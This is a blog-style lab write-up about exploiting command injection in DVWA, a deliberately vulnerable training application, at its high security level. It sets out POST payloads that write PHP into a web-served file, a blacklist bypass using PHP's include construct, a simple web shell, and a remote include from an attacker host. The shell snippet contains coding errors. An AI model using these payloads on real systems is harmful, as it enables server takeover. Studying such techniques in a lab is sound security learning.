### The unintended(?) way

I assume this was not the intended way to exploit this weakness, but then again, who wants to exploit something the intended way?

Step one is to check, whether we can still write text into a file. We can't use environment variables anymore, but being able to write (somewhat limited) arbitrary text into a file should be good enough.

```
// OWASP ZAP POST request
POST http://dvwa.whatever.tld/vulnerabilities/exec/ HTTP/1.1

// POST data
ip=.'test' 2>/var/www/dvwa/test.php&Submit=Submit

// GET result for /test.php
ping: .test: Name or service not known
```

Great, we can still write to a file in the web directory. Next we're going to try and inject some PHP code.

```
// POST data
ip=.'<?php echo "what is this then?<!--"?>' 2>/var/www/dvwa/test.php&Submit=Submit

// GET result for /test.php
ping: .what is this then?
```

Awesome, so PHP code is not a problem. Next, we want to execute system commands, and that's where it get a bit tricky, or so I thought.

```
// POST data
ip=.'<?php shell_exec("ls -lah")?>' 2>/var/www/dvwa/test.php&Submit=Submit

// GET result for /test.php
<blank page>
```

Damn. If we take a look at the blacklist above, it should be fairly obvious why that doesn't work. The characters `$`,`;`,`(` and `)` are all being filtered out, so our PHP coding options are somewhat limited.

The big question is, what can we do in PHP without these characters? Well, there are still some options. What we can use to our advantage in this scenario are language constructs ([see solidlystated of an explanation](http://solidlystated.com/scripting/php-functions-without-parentheses/)). Language constructs are similar to functions but don't require parantheses, as shown in the `echo` example above. Luckily, besides `echo`, there is also the construct `include`, which allows us to include local or even remote files, although the later requires `allow_url_include` to be enabled in the PHP options.

So, off we go to write our own dirty little PHP script which we host on a server that is reachable by our target machine. One very, very simple example would be:

```
<?php
$out=shell_execute($_REQUEST['cmd']);
echo "<br><b>CMDi result for:</b>".$_REQUEST['cmd']."<br>".$out"</br>;
?>
```

Of course, that's not secure coding at all, but I promise I won't ship it in production. With the script hosted, we can now attempt to inlcude it in DVWA using the following request.

```
// POST data
ip=.'<?php include "http://pwny.whatever.tld/cmd.php.txt"?><!--' 2>/var/www/dvwa/test.php&Submit=Submit
```

And the GET result for `/test.php?cmd=whoami` is?

![DVWA - Command Injection High - Exploitation Result](https://www.lastbreach.com/user/pages/03.blog/dvwa-unintended-command-injection-high/Screenshot_20180820_203556.png)

### Conclusion

Not much to say here, it was fun tinkering around with a vulnerability that I thought I knew already and finding a new way to exploit it. As I said, the `include` construct requires `allow_url_include` to be set in order to include remote sources, so this is not a sure fire way of exploiting a faulty command execution feature. Nevertheless, I learned a new approach to this type of vulnerability and I hope other have too by reading this. If you have questions or additional ideas, I'm all ears. Best tweet me [@hashtagsecurity](https://twitter.com/HashtagSecurity) or us [@LastBreach](https://twitter.com/LastBreach).
-   [http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution](http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution)
-   [http://www.ss64.com/bash/](http://www.ss64.com/bash/)
-   [http://www.ss64.com/nt/](http://www.ss64.com/nt/)
-   [https://owasp.org/www-community/attacks/Command\_Injection](https://owasp.org/www-community/attacks/Command_Injection)